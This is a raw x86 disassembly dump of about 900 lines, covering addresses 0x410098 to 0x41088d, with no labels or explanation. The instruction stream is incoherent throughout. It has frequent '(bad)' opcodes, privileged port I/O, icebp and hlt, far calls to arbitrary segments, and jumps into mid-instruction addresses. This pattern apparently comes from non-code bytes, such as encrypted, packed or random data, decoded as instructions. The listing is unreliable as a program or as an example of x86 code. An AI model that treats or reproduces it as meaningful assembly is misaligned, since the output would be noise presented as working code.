  410098:	xor    al,0x8f
  41009a:	enter  0xfc88,0xf8
  41009e:	dec    esi
  41009f:	leave  
  4100a0:	mov    bl,0xe9
  4100a2:	mov    ah,0x1a
  4100a4:	and    edx,DWORD PTR [edx-0x651c1c61]
  4100aa:	add    BYTE PTR cs:0xde782826,bl
  4100b1:	pop    eax
  4100b2:	pushf  
  4100b3:	adc    eax,0x1df975df
  4100b8:	psubb  mm2,QWORD PTR [ebp-0x103abc83]
  4100bf:	enter  0x69cc,0xa1
  4100c3:	mov    cl,0x8a
  4100c5:	push   esp
  4100c6:	stos   BYTE PTR es:[edi],al
  4100c7:	ret    
  4100c8:	and    bh,BYTE PTR [edi+ecx*8+0x4a]
  4100cc:	inc    esp
  4100cd:	push   ebp
  4100ce:	cli    
  4100cf:	rol    BYTE PTR [ebx-0x31],0x5c
  4100d3:	and    ebp,esi
  4100d5:	je     0x410155
  4100d7:	jmp    0x410140
  4100d9:	fcmovb st,st(4)
  4100db:	push   eax
  4100dc:	pop    edx
  4100dd:	adc    bh,BYTE PTR ds:0x88126cb3
  4100e4:	sub    ah,bl
  4100e6:	test   DWORD PTR [eax-0x751893b2],esi
  4100ec:	xor    eax,0xec9c64cc
  4100f1:	cdq    
  4100f2:	hlt    
  4100f3:	pop    ecx
  4100f4:	pop    ss
  4100f5:	daa    
  4100f6:	cmp    al,0xf
  4100f8:	xchg   DWORD PTR [edx-0x68c0b477],edi
  4100fe:	iret   
  4100ff:	fld    QWORD PTR [edi]
  410101:	push   0xb2d80d7d
  410106:	mov    ch,0x70
  410108:	mov    BYTE PTR [ebx-0xe],bh
  41010b:	mov    edx,edi
  41010d:	sub    cl,BYTE PTR ds:0x54fd3c5b
  410113:	push   ss
  410114:	inc    esi
  410115:	test   al,0xd9
  410117:	adc    al,0x61
  410119:	fst    DWORD PTR [eax-0x58cce525]
  41011f:	and    DWORD PTR [ecx],ecx
  410121:	addr16 pushf 
  410123:	or     BYTE PTR [edi-0x44d9b5ba],dl
  410129:	pop    ds
  41012a:	lock rol al,1
  41012d:	jmp    0x4100b8
  41012f:	cmp    al,0x3c
  410131:	mov    esi,?
  410133:	scas   al,BYTE PTR es:[edi]
  410134:	(bad)  
  410135:	dec    esp
  410136:	sbb    al,0x76
  410138:	adc    edx,DWORD PTR [edi+0x77]
  41013b:	fwait
  41013c:	mov    esp,0xd956de4f
  410141:	add    DWORD PTR [esi+0x26],eax
  410144:	clc    
  410145:	xor    al,0x8e
  410147:	inc    ecx
  410148:	dec    edx
  410149:	and    DWORD PTR [eax-0x22601603],esi
  41014f:	jnp    0x41016d
  410151:	or     eax,0xb4f0df77
  410156:	loope  0x41017d
  410158:	push   edi
  410159:	dec    edi
  41015a:	in     al,dx
  41015b:	fild   QWORD PTR [eax]
  41015d:	inc    eax
  41015e:	ficomp WORD PTR [ecx+0x3c]
  410161:	fsub   QWORD PTR [edx]
  410163:	sub    BYTE PTR [esi],ch
  410165:	leave  
  410166:	bound  edi,QWORD PTR [ecx+0xb7936e6]
  41016c:	mov    eax,edi
  41016e:	adc    DWORD PTR ds:0xacabc4c9,ebp
  410174:	dec    esp
  410175:	imul   ebx,esp,0x97f90096
  41017b:	retf   0x95d
  41017e:	or     edi,ebp
  410180:	jg     0x410169
  410182:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410183:	mov    esp,0x7efc0ff2
  410188:	or     al,0xb4
  41018a:	fwait
  41018b:	stos   BYTE PTR es:[edi],al
  41018c:	mov    dh,BYTE PTR [edi+0x32]
  41018f:	adc    BYTE PTR [ecx-0x30],dh
  410192:	jnp    0x4101d3
  410194:	push   ebp
  410195:	dec    edx
  410196:	rcl    BYTE PTR [ebx+0x1d],0x4a
  41019a:	and    eax,0xaf0ab3a4
  41019f:	and    edi,DWORD PTR [esi+0x1912c7e3]
  4101a5:	es add ecx,esp
  4101a8:	adc    al,0xa4
  4101aa:	or     BYTE PTR [edi],dl
  4101ac:	out    0x44,al
  4101ae:	sub    ecx,DWORD PTR [edx]
  4101b0:	sub    al,0x23
  4101b2:	shl    BYTE PTR [ecx-0x7],1
  4101b5:	data16 int3 
  4101b7:	fwait
  4101b8:	int    0xe0
  4101ba:	jno    0x4101db
  4101bc:	xchg   esp,eax
  4101bd:	push   esi
  4101be:	ins    DWORD PTR es:[edi],dx
  4101bf:	push   ebx
  4101c0:	test   ch,bh
  4101c2:	test   eax,0xade91fae
  4101c7:	out    dx,eax
  4101c8:	push   eax
  4101c9:	arpl   dx,bp
  4101cb:	mov    al,ds:0xdf4f7231
  4101d0:	xchg   ebx,eax
  4101d1:	nop
  4101d2:	inc    ebx
  4101d3:	out    dx,eax
  4101d4:	xchg   esi,eax
  4101d5:	fcomp  st(2)
  4101d7:	cmc    
  4101d8:	xor    eax,0xc3bdde7b
  4101dd:	mov    DWORD PTR [eax-0x25a858da],eax
  4101e3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4101e4:	jp     0x410197
  4101e6:	sti    
  4101e7:	outs   dx,DWORD PTR ds:[esi]
  4101e8:	cmp    eax,0x561fadfe
  4101ed:	stos   DWORD PTR es:[edi],eax
  4101ee:	push   edi
  4101ef:	pop    es
  4101f0:	xchg   ebp,eax
  4101f1:	dec    edi
  4101f2:	(bad)  [edx]
  4101f4:	std    
  4101f5:	div    al
  4101f7:	fsub   QWORD PTR [esp+eiz*8]
  4101fa:	cs push 0x0
  4101fd:	cld    
  4101fe:	loop   0x41022b
  410200:	repnz inc ecx
  410202:	jo     0x4101fe
  410204:	sub    al,ch
  410206:	das    
  410207:	les    edx,FWORD PTR [edi+eax*2-0x66]
  41020b:	and    edi,DWORD PTR [eax-0x4a39aa39]
  410211:	icebp  
  410212:	repz cs or edx,eax
  410216:	xchg   edx,eax
  410217:	adc    BYTE PTR [ebx-0x23571818],ch
  41021d:	rcr    ebx,0x56
  410220:	pshufw mm3,QWORD PTR [edx+esi*2+0x73f7633f],0xbf
  410229:	mov    eax,ds:0xa46e9b7e
  41022e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41022f:	add    BYTE PTR [ecx],dh
  410231:	fpatan 
  410233:	fadd   DWORD PTR [ebp+0x25c61184]
  410239:	not    esi
  41023b:	mov    ebx,0x9e5c9a31
  410240:	mov    ch,BYTE PTR [edx-0x19]
  410243:	icebp  
  410244:	sbb    BYTE PTR [edx-0x72],cl
  410247:	in     eax,dx
  410248:	out    0x72,eax
  41024a:	out    dx,al
  41024b:	sub    esp,DWORD PTR [ecx+0x73]
  41024e:	out    0x80,al
  410250:	xlat   BYTE PTR ds:[ebx]
  410251:	xchg   dh,bh
  410253:	inc    esi
  410254:	inc    edi
  410255:	pop    ebp
  410256:	dec    ebp
  410257:	fdivr  QWORD PTR [esi]
  410259:	and    eax,0xc7c01a78
  41025e:	mov    eax,0xa65a00a8
  410263:	das    
  410264:	mov    ch,0x7c
  410266:	adc    bl,al
  410268:	gs inc esp
  41026a:	push   cs
  41026b:	xchg   ecx,eax
  41026c:	into   
  41026d:	in     eax,dx
  41026e:	mov    esi,0xc3d87198
  410273:	cmp    ecx,DWORD PTR [eax-0xf]
  410276:	test   al,0x5b
  410278:	call   0xb069:0xaeddd32c
  41027f:	test   eax,0xaf13b88f
  410284:	xchg   edi,eax
  410285:	shl    DWORD PTR [ecx-0x4af971a8],cl
  41028b:	imul   ecx,ebp,0x61
  41028e:	clc    
  41028f:	xor    al,0x9
  410291:	mov    ebx,0x3a11b138
  410296:	shl    al,0x3c
  410299:	nop
  41029a:	repz add eax,0x6f8caaaf
  4102a0:	xor    BYTE PTR [esi-0x10],dl
  4102a3:	push   ecx
  4102a4:	cmp    esp,DWORD PTR [ebx-0x2981ff41]
  4102aa:	xlat   BYTE PTR ds:[ebx]
  4102ab:	mov    dl,0x8a
  4102ad:	test   eax,0xc8f9bafe
  4102b2:	mov    WORD PTR [ecx],?
  4102b4:	pop    ebp
  4102b5:	xor    al,0xe7
  4102b7:	pop    ss
  4102b8:	scas   eax,DWORD PTR es:[edi]
  4102b9:	mov    edi,0x77f157d4
  4102be:	xchg   DWORD PTR [ecx+0x68f01aca],esp
  4102c4:	xchg   ebp,eax
  4102c5:	scas   al,BYTE PTR es:[edi]
  4102c6:	dec    eax
  4102c7:	and    DWORD PTR [esi-0x7282314c],0x777bc779
  4102d1:	mov    ds:0xe11d8016,al
  4102d6:	push   ecx
  4102d7:	or     eax,0xb1bac7d4
  4102dc:	mov    al,ds:0xc921edf6
  4102e1:	push   ss
  4102e2:	mov    ch,BYTE PTR [ecx]
  4102e4:	dec    esi
  4102e5:	out    dx,eax
  4102e6:	hlt    
  4102e7:	nop
  4102e8:	and    eax,0x7b88f86e
  4102ed:	pop    esp
  4102ee:	mov    ebp,0xd24a612d
  4102f3:	ret    0xa004
  4102f6:	and    esp,ebx
  4102f8:	rcl    ebx,cl
  4102fa:	fisub  DWORD PTR [edi-0x6c5a7240]
  410300:	mov    ch,0xf0
  410302:	ja     0x410372
  410304:	rcl    BYTE PTR [edx],1
  410306:	xor    eax,0x9f676e5a
  41030b:	xchg   esi,eax
  41030c:	sub    ebx,DWORD PTR [esi+edi*1]
  41030f:	iret   
  410310:	les    esp,FWORD PTR [ebp+0x7]
  410313:	cli    
  410314:	inc    esi
  410315:	pop    esi
  410316:	mov    ds:0x1c44fde4,al
  41031b:	push   esi
  41031c:	(bad)  
  41031d:	jmp    0xf160:0xdac81809
  410324:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410325:	push   ebp
  410326:	lods   eax,DWORD PTR ds:[esi]
  410327:	and    al,0x36
  410329:	inc    edx
  41032a:	mov    ebp,0x352e774b
  41032f:	sti    
  410330:	xchg   edx,eax
  410331:	dec    eax
  410332:	outs   dx,BYTE PTR ds:[esi]
  410333:	or     eax,0x7975b52d
  410338:	adc    ch,BYTE PTR [esi-0x35]
  41033b:	in     eax,dx
  41033c:	(bad)  
  41033d:	push   ebx
  41033e:	into   
  41033f:	jmp    0x103c664a
  410344:	cmc    
  410345:	add    dl,bl
  410347:	inc    ebx
  410348:	rol    DWORD PTR [edi-0x60],cl
  41034b:	cmp    edi,edi
  41034d:	push   ss
  41034e:	mov    edi,0xf8585c4c
  410353:	ret    
  410354:	sbb    cl,BYTE PTR [eax+0x8]
  410357:	fcom   st(4)
  410359:	mov    ds:0x10a1c829,eax
  41035e:	cs pop edx
  410360:	imul   ecx,edx,0x42bc4ebf
  410366:	and    al,0x84
  410368:	mov    ah,0x67
  41036a:	cmp    eax,0x77fda478
  41036f:	jmp    0x952230f
  410374:	mov    ecx,0x315287e6
  410379:	(bad)  
  41037a:	pop    ecx
  41037b:	sahf   
  41037c:	outs   dx,BYTE PTR ds:[esi]
  41037d:	mov    cl,0x3
  41037f:	sub    al,0xa2
  410381:	lea    edx,[ebp+0x14bbac72]
  410387:	mov    esp,0x9d33cac2
  41038c:	lahf   
  41038d:	bound  eax,QWORD PTR [ebx+0x2a]
  410390:	ficom  DWORD PTR [eax-0x734ab477]
  410396:	dec    DWORD PTR [ebx]
  410398:	jno    0x41038d
  41039a:	in     eax,0x53
  41039c:	cdq    
  41039d:	xchg   esi,eax
  41039e:	ins    BYTE PTR es:[edi],dx
  41039f:	sub    BYTE PTR [esi-0x73e114d9],dl
  4103a5:	dec    edx
  4103a6:	mov    ecx,0x8a3af7c4
  4103ab:	lock repnz pop ebx
  4103ae:	in     eax,dx
  4103af:	add    eax,0xe9d99276
  4103b4:	mov    ds:0xe3b0f34d,al
  4103b9:	push   ebx
  4103ba:	enter  0x2eb2,0xc9
  4103be:	xchg   ecx,eax
  4103bf:	sub    DWORD PTR [ebx-0x6ec7e28f],esp
  4103c5:	mov    DWORD PTR [ebp+ebx*1-0x31a838f1],ebp
  4103cc:	leave  
  4103cd:	add    cl,BYTE PTR [esi]
  4103cf:	ror    DWORD PTR [edx-0xc],1
  4103d2:	fsubr  QWORD PTR [esi]
  4103d4:	dec    esi
  4103d5:	loop   0x4103e5
  4103d7:	rcr    edi,cl
  4103d9:	lea    esi,[esi+ebx*1+0x7c2f6f1c]
  4103e0:	or     bh,BYTE PTR [eax-0x56]
  4103e3:	mov    cl,0x74
  4103e5:	pop    edx
  4103e6:	jo     0x4103a1
  4103e8:	icebp  
  4103e9:	stos   BYTE PTR es:[edi],al
  4103ea:	push   ecx
  4103eb:	lock inc ebp
  4103ed:	or     BYTE PTR [ecx],al
  4103ef:	dec    esi
  4103f0:	mov    dl,0xe2
  4103f2:	adc    eax,0x64910eaf
  4103f7:	jle    0x4103c8
  4103f9:	jbe    0x41043e
  4103fb:	mov    bl,0x13
  4103fd:	cmp    DWORD PTR ds:0x2cda9306,esp
  410403:	ret    
  410404:	inc    ecx
  410405:	pusha  
  410406:	ss daa 
  410408:	(bad)  
  410409:	mov    ecx,0x1869f804
  41040e:	fdivr  DWORD PTR [ebp+edx*1+0x44]
  410412:	lds    ecx,FWORD PTR [ecx]
  410414:	push   0xfa68710e
  410419:	dec    esi
  41041a:	mov    ebx,DWORD PTR cs:0xa7fbc153
  410421:	cwde   
  410422:	dec    esp
  410423:	cwde   
  410424:	mov    bh,0xd7
  410426:	(bad)  [edi-0xb579f5f]
  41042c:	push   edi
  41042d:	pop    esp
  41042e:	cvtps2pd xmm1,QWORD PTR [edi+ecx*8-0x5c9e6afe]
  410436:	out    dx,al
  410437:	mov    ds:0xcff51e7d,al
  41043c:	mov    ch,BYTE PTR [edx]
  41043e:	xor    bl,BYTE PTR [ebp-0x72]
  410441:	push   eax
  410442:	and    esp,DWORD PTR [edx+ecx*2]
  410445:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410446:	clc    
  410447:	imul   edx,esp,0x7c
  41044a:	(bad)  
  41044b:	adc    ebx,ebp
  41044d:	add    edi,0xffffffb5
  410450:	retf   
  410451:	scas   al,BYTE PTR es:[edi]
  410452:	std    
  410453:	inc    esi
  410454:	adc    esi,ebp
  410456:	xor    al,0xc0
  410458:	(bad)  
  410459:	jns    0x410457
  41045b:	stc    
  41045c:	xor    BYTE PTR [edi+0x198e68ca],ch
  410462:	lahf   
  410463:	iret   
  410464:	out    0xc9,al
  410466:	dec    BYTE PTR [ebx+0x17]
  410469:	sub    DWORD PTR [edx+edx*4+0x32],0x0
  41046e:	mov    ds:0xc75e794e,al
  410473:	pop    ss
  410474:	push   edx
  410475:	dec    esi
  410476:	cmp    ah,BYTE PTR [eax+eax*4]
  410479:	leave  
  41047a:	mov    ds:0x574440a7,eax
  41047f:	xchg   esp,eax
  410480:	mov    ch,0xa
  410482:	inc    edx
  410483:	out    0x8e,al
  410485:	xchg   esp,esi
  410487:	adc    eax,0x80739152
  41048c:	xchg   BYTE PTR [ecx-0x6f],bh
  41048f:	fld    TBYTE PTR [ebp+0x3e62460b]
  410495:	out    0xde,eax
  410497:	pop    ecx
  410498:	pop    ss
  410499:	xor    eax,0xf782cf9b
  41049e:	sbb    ebx,DWORD PTR [ebx]
  4104a0:	in     al,0x9e
  4104a2:	sbb    eax,0xbb9cafc5
  4104a7:	daa    
  4104a8:	inc    esp
  4104a9:	test   eax,0x16520d3e
  4104ae:	int3   
  4104af:	lea    ecx,[esi-0x5e0cb87f]
  4104b5:	cwde   
  4104b6:	imul   DWORD PTR [ebp-0x4a21463e]
  4104bc:	es dec edx
  4104be:	jle    0x4104be
  4104c0:	mov    DWORD PTR [eax],edi
  4104c2:	neg    BYTE PTR [ebp-0x6d18d351]
  4104c8:	popa   
  4104c9:	mov    ecx,0x160646ae
  4104ce:	pop    ss
  4104cf:	push   cx
  4104d1:	or     eax,0xa4e22102
  4104d6:	stos   DWORD PTR es:[edi],eax
  4104d7:	scas   al,BYTE PTR es:[edi]
  4104d8:	dec    ebx
  4104d9:	add    dl,dl
  4104db:	mov    esp,0xedca0e5a
  4104e0:	(bad)  
  4104e1:	xor    BYTE PTR [esi],al
  4104e3:	(bad)  
  4104e4:	ja     0x41054a
  4104e6:	inc    eax
  4104e7:	(bad)  [edx]
  4104e9:	call   0xcd3c8b66
  4104ee:	nop
  4104ef:	mov    ch,0xb5
  4104f1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4104f2:	shl    esi,cl
  4104f4:	adc    al,0xd8
  4104f6:	jecxz  0x410556
  4104f8:	je     0x41052c
  4104fa:	xor    al,0x25
  4104fc:	and    al,0xa
  4104fe:	icebp  
  4104ff:	call   0x28e4ab9b
  410504:	add    eax,0x5fabb4cb
  410509:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41050a:	popa   
  41050b:	or     ebx,DWORD PTR [esi]
  41050d:	dec    ebx
  41050e:	test   DWORD PTR [esi+0x2b],eax
  410511:	mov    ds:0xe97b545c,eax
  410516:	test   al,0x57
  410518:	jmp    0x4104f8
  41051a:	cmp    dh,BYTE PTR [ecx]
  41051c:	jne    0x4104e2
  41051e:	mov    edx,0xcd8134b8
  410523:	in     eax,0xe8
  410525:	xor    al,0x3
  410527:	inc    edi
  410528:	mov    edi,0xb187814f
  41052d:	mov    eax,0xdfeac3cb
  410532:	sbb    cl,ch
  410534:	xor    ah,BYTE PTR [si-0x68]
  410538:	jl     0x410594
  41053a:	jl     0x410513
  41053c:	dec    ecx
  41053d:	hlt    
  41053e:	in     eax,dx
  41053f:	std    
  410540:	mov    esp,0x1f175213
  410545:	or     ah,BYTE PTR [ebx+ebp*8]
  410548:	out    dx,al
  410549:	lods   eax,DWORD PTR ds:[esi]
  41054a:	xor    ecx,edx
  41054c:	pop    sp
  41054e:	add    eax,0x7271a8cf
  410553:	add    cl,BYTE PTR [edx-0x36]
  410556:	daa    
  410557:	inc    DWORD PTR [esi+ebp*1-0x21]
  41055b:	pcmpgtd mm0,mm7
  41055e:	adc    bl,cl
  410560:	jae    0x41054f
  410562:	pop    esi
  410563:	push   0x7fe937b4
  410568:	pushf  
  410569:	out    0xc,eax
  41056b:	ret    
  41056c:	loope  0x41056b
  41056e:	adc    dh,BYTE PTR [ebp+0xd]
  410571:	in     al,dx
  410572:	or     BYTE PTR [edi],bh
  410574:	sbb    edi,DWORD PTR [eax+0x40e0fe1]
  41057a:	shl    bh,0x60
  41057d:	push   cs
  41057e:	or     BYTE PTR [edi+edx*8+0x297e1de3],dl
  410585:	jae    0x410596
  410587:	div    DWORD PTR [eax+edx*4-0x6aec9cb0]
  41058e:	sbb    DWORD PTR [eax+0x25acc1f5],esi
  410594:	push   ebx
  410595:	arpl   sp,ax
  410597:	push   0x15
  410599:	jecxz  0x4105cc
  41059b:	aad    0xd5
  41059d:	push   edi
  41059e:	test   al,0xf4
  4105a0:	cmp    DWORD PTR [esi-0x1e],esp
  4105a3:	mov    eax,ds:0x58dd348e
  4105a8:	jae    0x410532
  4105aa:	pop    esi
  4105ab:	mov    ds:0x2b2c9e2,eax
  4105b0:	push   ebx
  4105b1:	pop    esi
  4105b2:	test   eax,0x6fb6b597
  4105b7:	sti    
  4105b8:	inc    ecx
  4105b9:	jg     0x410552
  4105bb:	aas    
  4105bc:	cmp    esp,esp
  4105be:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4105bf:	adc    ebp,DWORD PTR [esi+0x2e303aa9]
  4105c5:	lods   eax,DWORD PTR ds:[esi]
  4105c6:	and    cl,ah
  4105c8:	pop    ss
  4105c9:	mov    BYTE PTR [ecx],ah
  4105cb:	repnz into 
  4105cd:	jmp    0xdda5:0xa9efa7aa
  4105d4:	inc    ebp
  4105d5:	add    DWORD PTR [edi-0x48],ecx
  4105d8:	adc    edx,DWORD PTR [edx]
  4105da:	imul   edi,eax,0x9b39807a
  4105e0:	rcl    BYTE PTR [edi+0x54e74781],cl
  4105e6:	repz loope 0x4105bd
  4105e9:	std    
  4105ea:	inc    ebp
  4105eb:	and    al,0x48
  4105ed:	dec    ecx
  4105ee:	jmp    0x410579
  4105f0:	imul   ebx,DWORD PTR [eax],0x3f
  4105f3:	mov    edi,DWORD PTR [edx]
  4105f5:	xchg   edi,eax
  4105f6:	test   edx,0x27d3e202
  4105fc:	and    al,0x72
  4105fe:	adc    ebx,edx
  410600:	adc    eax,0x80bf3138
  410605:	mov    al,0x7f
  410607:	jae    0x410607
  410609:	pop    ds
  41060a:	adc    esp,DWORD PTR [ecx+edx*4-0x6f]
  41060e:	xchg   edx,eax
  41060f:	mov    esp,0x9aacece6
  410614:	xchg   ebx,eax
  410615:	sub    ch,BYTE PTR [edi]
  410617:	outs   dx,BYTE PTR ds:[esi]
  410618:	(bad)  
  410619:	mov    ds:0xd2e48e98,eax
  41061e:	loope  0x41062e
  410620:	push   ebp
  410621:	xor    dh,BYTE PTR [edx+0x6a]
  410624:	loopne 0x41066f
  410626:	ss mov ebx,0xac6bef0a
  41062c:	(bad)  
  41062d:	pop    ecx
  41062e:	out    dx,eax
  41062f:	cwde   
  410630:	push   ebp
  410631:	add    al,0x5b
  410633:	sub    ch,BYTE PTR [esi]
  410635:	ins    DWORD PTR es:[edi],dx
  410636:	and    al,0x6f
  410638:	cmp    ecx,DWORD PTR [edx-0x29df9cea]
  41063e:	sub    BYTE PTR [ebx-0x554c6d09],0xe9
  410645:	xchg   esp,eax
  410646:	xchg   DWORD PTR [edi-0x54],ebx
  410649:	call   0x53b46e6a
  41064e:	in     eax,0x10
  410650:	rcl    BYTE PTR [ecx-0x52fba97],cl
  410656:	dec    esp
  410657:	jp     0x41062a
  410659:	(bad)  
  41065a:	mov    eax,ds:0x33c00b56
  41065f:	add    bh,BYTE PTR [ebp-0x210530a5]
  410665:	mov    ds:0xa95c2c50,al
  41066a:	lds    esi,FWORD PTR [ebx]
  41066c:	daa    
  41066d:	pop    esp
  41066e:	or     esi,DWORD PTR [eax+0xf]
  410671:	pop    esp
  410672:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410673:	in     eax,0x8e
  410675:	in     al,0xaf
  410677:	inc    ecx
  410678:	imul   edi,DWORD PTR [eax+edx*1+0x2a3c8ca3],0xade676a1
  410683:	lds    ebx,FWORD PTR [eax]
  410685:	jmp    0x1edc7f2c
  41068a:	push   es
  41068b:	pop    edi
  41068c:	call   0x42ba:0xbc26cac5
  410693:	out    0x98,al
  410695:	jg     0x41062b
  410697:	jo     0x410645
  410699:	pop    edx
  41069a:	jp     0x410675
  41069c:	pop    ebp
  41069d:	leave  
  41069e:	dec    esp
  41069f:	std    
  4106a0:	pop    dx
  4106a2:	jmp    FWORD PTR [ebp+eiz*8+0x37]
  4106a6:	aaa    
  4106a7:	xchg   DWORD PTR ds:0xbbd149ab,ecx
  4106ad:	ins    BYTE PTR es:[edi],dx
  4106ae:	hlt    
  4106af:	test   al,0x3
  4106b1:	sub    BYTE PTR [esi+0x1639303e],dh
  4106b7:	mov    ebp,0x3d29ca60
  4106bc:	sbb    dh,BYTE PTR [esi]
  4106be:	scas   eax,DWORD PTR es:[edi]
  4106bf:	sbb    DWORD PTR [ebx],edx
  4106c1:	mov    bl,0x5c
  4106c3:	ins    BYTE PTR es:[edi],dx
  4106c4:	xchg   edi,eax
  4106c5:	stos   BYTE PTR es:[edi],al
  4106c6:	xchg   ebp,eax
  4106c7:	fcom   QWORD PTR gs:[edi+0x3e2bde9f]
  4106ce:	and    BYTE PTR [edi+0x7a],ch
  4106d1:	add    al,0x42
  4106d3:	mov    edx,0x859fdd77
  4106d8:	jecxz  0x4106b1
  4106da:	es ja  0x41070b
  4106dd:	shl    bl,1
  4106df:	mov    eax,ds:0x6c1799b4
  4106e4:	pop    ss
  4106e5:	xlat   BYTE PTR ds:[ebx]
  4106e6:	and    ch,0x81
  4106e9:	inc    edx
  4106ea:	inc    dl
  4106ec:	cwde   
  4106ed:	cmp    eax,ebp
  4106ef:	aad    0x57
  4106f1:	pusha  
  4106f2:	adc    eax,0xf4b01629
  4106f7:	loop   0x4106a3
  4106f9:	and    bl,dl
  4106fb:	and    DWORD PTR [edx+0x7287c133],0xa133e0a7
  410705:	cmp    BYTE PTR [edx+edx*2+0x64310f7c],ah
  41070c:	call   0xcecc:0x426d96ad
  410713:	xor    al,0x37
  410715:	inc    ebp
  410716:	inc    esi
  410717:	pushw  0x7153
  41071b:	fs repz inc edi
  41071e:	jo     0x410787
  410720:	and    eax,0x3d5fb5c8
  410725:	dec    edx
  410726:	aas    
  410727:	mov    dh,0xb6
  410729:	es xor eax,0x6edb2e72
  41072f:	jnp    0x41079d
  410731:	jmp    0xb10d:0x3c35fa79
  410738:	sub    al,0xdd
  41073a:	mov    ebx,DWORD PTR [ebx]
  41073c:	leave  
  41073d:	lds    esp,FWORD PTR [edx]
  41073f:	pop    es
  410740:	loopne 0x4106f2
  410742:	jne    0x410739
  410744:	div    dl
  410746:	sbb    al,0x9f
  410748:	popf   
  410749:	dec    esp
  41074a:	cmp    al,0xc7
  41074c:	mov    bh,0x6b
  41074e:	(bad)  
  41074f:	(bad)  
  410751:	(bad)  
  410752:	push   ebp
  410753:	jb     0x4106ec
  410755:	int    0x3f
  410757:	pushw  ds
  410759:	cmp    DWORD PTR [edx-0x31],ecx
  41075c:	jbe    0x4107a1
  41075e:	fs (bad) 
  410760:	xor    edi,DWORD PTR [ecx-0x1abdafbf]
  410766:	sub    BYTE PTR [esp+edi*1+0x2],bh
  41076a:	mov    ebp,0x6241e469
  41076f:	les    edi,FWORD PTR [ebx+0x342d42c4]
  410775:	sbb    dh,BYTE PTR [edx]
  410777:	push   0xffffffdb
  410779:	and    DWORD PTR [edx],eax
  41077b:	inc    edx
  41077c:	inc    ebx
  41077d:	(bad)  
  41077e:	(bad)  
  41077f:	push   edx
  410780:	fdivp  st(6),st
  410782:	xlat   BYTE PTR ds:[ebx]
  410783:	call   0xff67:0x4e320749
  41078a:	pop    ebx
  41078b:	push   0x3c156c2f
  410790:	fbstp  TBYTE PTR [edx+0xf]
  410793:	mov    dh,0x0
  410795:	inc    edx
  410796:	fadd   DWORD PTR [ebx]
  410798:	adc    al,0xa
  41079a:	mov    ch,0xcc
  41079c:	or     al,0xe1
  41079e:	out    dx,eax
  41079f:	mov    eax,ds:0x521b3c93
  4107a4:	imul   ebp,edi,0x98caff29
  4107aa:	mov    ch,BYTE PTR [ecx-0x7f]
  4107ad:	xchg   ebp,eax
  4107ae:	lds    ebp,FWORD PTR [ecx+0x19d200b7]
  4107b4:	jne    0x410739
  4107b6:	outs   dx,BYTE PTR ds:[esi]
  4107b7:	clc    
  4107b8:	or     eax,0x479594a1
  4107bd:	rcl    DWORD PTR [ecx-0x14],1
  4107c0:	loopne 0x410798
  4107c2:	pushf  
  4107c3:	jns    0x410806
  4107c5:	or     eax,0x331da892
  4107ca:	push   ss
  4107cb:	fcmovu st,st(2)
  4107cd:	pop    ds
  4107ce:	dec    ebx
  4107cf:	dec    ebp
  4107d0:	std    
  4107d1:	out    dx,eax
  4107d2:	inc    eax
  4107d3:	xor    al,0x6c
  4107d5:	mov    ah,0x3f
  4107d7:	mov    dh,0xfa
  4107d9:	xor    DWORD PTR [edi-0x4108302b],ebp
  4107df:	int3   
  4107e0:	cmp    dh,BYTE PTR [edi+ebp*4+0x35217a29]
  4107e7:	push   esp
  4107e8:	jecxz  0x4107f8
  4107ea:	lods   eax,DWORD PTR ds:[esi]
  4107eb:	std    
  4107ec:	pop    es
  4107ed:	pop    es
  4107ee:	(bad)  
  4107ef:	and    cl,dl
  4107f1:	shl    DWORD PTR [eax],1
  4107f3:	xor    BYTE PTR ds:0x39e4813d,0xb1
  4107fa:	or     ecx,DWORD PTR [edi+0x48329f25]
  410800:	ins    DWORD PTR es:[edi],dx
  410801:	icebp  
  410802:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410803:	push   ss
  410804:	mov    ch,0x79
  410806:	iret   
  410807:	cmp    eax,0x4932bd9
  41080c:	sub    DWORD PTR [ebp-0x64],0xffffffc3
  410810:	push   ebx
  410811:	mov    ?,WORD PTR [ebx+0x1e]
  410814:	mov    esp,0xc4a058d2
  410819:	mov    dh,0xdf
  41081b:	xor    eax,0x81f0f115
  410820:	mov    ah,0xb7
  410822:	add    ch,ch
  410824:	push   cs
  410825:	xor    BYTE PTR [ebp+0xf],0x56
  410829:	jle    0x41080b
  41082b:	imul   edx,esp,0x5b
  41082e:	les    eax,FWORD PTR [ebp+0x41]
  410831:	out    dx,al
  410832:	push   ss
  410833:	test   DWORD PTR [edi-0x41],edx
  410836:	jo     0x410833
  410838:	adc    BYTE PTR [ecx+0x25],0x45
  41083c:	sar    BYTE PTR [edi],cl
  41083e:	ds pusha 
  410840:	cmp    al,0x8f
  410842:	out    0xd1,eax
  410844:	test   BYTE PTR [ebx-0x4b718c0c],dh
  41084a:	xchg   BYTE PTR [esi+eiz*8+0x5d],cl
  41084e:	rol    BYTE PTR [edx],0x1e
  410851:	sub    BYTE PTR [eax],ch
  410853:	push   ss
  410854:	aad    0xa6
  410856:	in     al,dx
  410857:	xor    bl,BYTE PTR [ebx+0x36]
  41085a:	mov    al,0x8
  41085c:	inc    ebx
  41085d:	lock mov ecx,DWORD PTR ds:0x5ecb2259
  410864:	xor    al,0x62
  410866:	scas   al,BYTE PTR es:[edi]
  410867:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410868:	lahf   
  410869:	idiv   BYTE PTR [edx+0x25]
  41086c:	imul   eax,ebp,0x26
  41086f:	mov    bh,0x53
  410871:	rcr    DWORD PTR [edx+edx*1+0x17],0x73
  410876:	ss mov cl,0x19
  410879:	imul   ecx,DWORD PTR [eax-0x55],0xffffff89
  41087d:	adc    bl,BYTE PTR [edi-0x7002cdd2]
  410883:	pop    ecx
  410884:	aaa    
  410885:	sub    bl,BYTE PTR [esi+0x6c7cf509]
  41088b:	push   es
  41088c:	lods   eax,DWORD PTR ds:[esi]
  41088d:	mov    edi,0xf0c48312
